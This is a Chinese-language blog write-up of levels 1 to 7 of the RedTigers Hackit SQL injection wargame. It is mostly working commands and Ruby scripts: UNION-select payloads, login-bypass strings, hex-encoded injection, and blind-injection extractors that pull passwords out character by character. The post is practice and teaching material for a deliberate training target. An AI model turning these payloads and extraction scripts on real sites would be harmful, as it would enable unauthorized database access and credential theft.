---
layout: post
title: RedTigers Hackit Wargame - Level 1 ~ Level 7
author: MaskRay
tags: [security, wargame]
---

[RedTigers Hackit](http://redtiger.dyndns.org/hackit/)是關於PHP和SQL injection的wargame。

又開始做wargame了，這次的進步是用上了[HTTPie](http://httpie.org)，一個類似`curl`的工具，但語法比後者優雅一些。

<!-- more -->

## 1

```bash
http get 'http://redtiger.dyndns.org/hackit/level1.php' cat=='1 union select 1,2,username,password from level1_users'
```

## 2

指定`--session`選項就可以實現cookie jar功能了，請求時會發送`Cookie`首部，也會保存服務端發來的`Set-Cookie`首部，而`curl`裏實現同樣的同能需要指定`-b c -c c`。

```bash
http --session=./c -f post 'http://redtiger.dyndns.org/hackit/level2.php' username="' or 2='2" password="' or 2='2" login=Login
```

## 3

```bash
http --session=./c -f post 'http://redtiger.dyndns.org/hackit/level3.php' 'usr[]=='
```

報錯：

```
Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21
```

可以下載這個文件：

```bash
http --session=./c get 'http://redtiger.dyndns.org/hackit/urlcrypt.inc' --download
```

猜測`usr`字段被用來做SQL查詢了：

```bash
http --session=./c get 'http://redtiger.dyndns.org/hackit/level3.php' usr==$(php urlcrypt.inc "' union select 1,username,3,4,5,password,7 from level3_users where username='Admin' -- ")
```

## 4

Blind SQL injection，二分搜索枚舉每個位置的字符：

```ruby
require 'net/http'

ans = '*' * 17
worker = ->from, to {
  Net::HTTP.start('redtiger.dyndns.org') {|http|
    u = URI '/hackit/level4.php'
    (from...to).each {|pos|
      l = 32
      h = 126
      while l < h
        m = (l + h) / 2
        u.query = URI.encode_www_form id: "1 and if((select ord(mid(keyword,#{pos+1},1)))>#{m},1,0)"
        res = http.get(u.to_s, 'Cookie'=> 'level4login=****************').body
        #p res
        if res !~ /Query returned 0 rows/
          l = m + 1
        else
          h = m
        end
      end
      ans[pos] = l.chr
    }
  }
}
worker[0,17]
puts ans
```

## 5

```bash
pass=$(echo -n a | md5sum)
http --session=./c -f post 'http://redtiger.dyndns.org/hackit/level5.php?mode=login' username="' union select 1,'$pass" password=a login=Login
```

## 6

先確定SQL返回結果有5列，然後填充`Admin`：

```bash
http --session=./c 'http://redtiger.dyndns.org/hackit/level6.php' user=="0 union select 1,'Admin',3,4,5"
```

報錯：`Warning: mysql_fetch_object(): supplied argument is not a valid MySQL result resource in /var/www/hackit/level6.php on line 27`。

利用MySQL中xexadecimal literal默認爲字符串的性質，嘗試：

```bash
http --session=./c 'http://redtiger.dyndns.org/hackit/level6.php' user=="0 union select 1,0x61646d696e,3,4,5"
```

猜測第二列被用來做查詢了：

```bash
a=$(echo -n "' union select 1,username,3,password,5 from level6_users where status=1-- " | rax2 -S)
http --session=./c 'http://redtiger.dyndns.org/hackit/level6.php' user=="0 union select 1,0x$a,3,4,5"
```

## 7

```bash
http --session=./c -f post 'http://redtiger.dyndns.org/hackit/level7.php' search="xxx'" dosearch='search!'
```

觸發錯誤信息，瞭解到查詢用的SQL：

```sql
SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%#{serach}%' OR text.title LIKE '%#{search}%')
```

嘗試發現比較運算符及`substr`、`mid`、`left`等很多字符串函數被過濾了。枚舉得出`news.autor`的長度：

```bash
http --session=./c -f post 'http://redtiger.dyndns.org/hackit/level7.php' search="Google%' and length(news.autor)=17 and '%'='" dosearch='search!'
```

發現`locate`函數沒有過濾，找出`news.autor`中出現過的字符：

```ruby
Net::HTTP.start('redtiger.dyndns.org') {|http|
  u = URI '/hackit/level7.php'
  [('a'..'z').to_a,('0'..'9').to_a].flatten.each {|c|
    post = Net::HTTP::Post.new u.to_s
    post.set_form_data dosearch: 'search!', search: "Google%' and locate('#{c}',news.autor)=0 and '%'='"
    post['Cookie'] = 'level7login=dont_shout_at_your_disks%2A%2A%2A'
    puts c if http.request(post).body !~ /Geolocation/
  }
}
```

得到這些：`efglorstu0`。然後開始枚舉17位密碼中每一位的字符：

```ruby
u = URI '/hackit/level7.php'
w = ''

Net::HTTP.start('redtiger.dyndns.org') {|http|
  while w.size < 17
    'efglorstu0'.chars {|c|
      post = Net::HTTP::Post.new u.to_s
      post.set_form_data dosearch: 'search!', search: "Google%' and locate('#{w}#{c}',news.autor)=1 and '%'='"
      post['Cookie'] = 'level7login=***********'
      res = http.request(post).body
      if res =~ /Geolocation/
        w << c
        puts w
      end
    }
  end
}
```

得到了密碼，但是

```bash
http --session=./c -f post 'http://redtiger.dyndns.org/hackit/level7.php' username='*****************' try='Check!'
```

提示不正確……錯在哪裏了啊
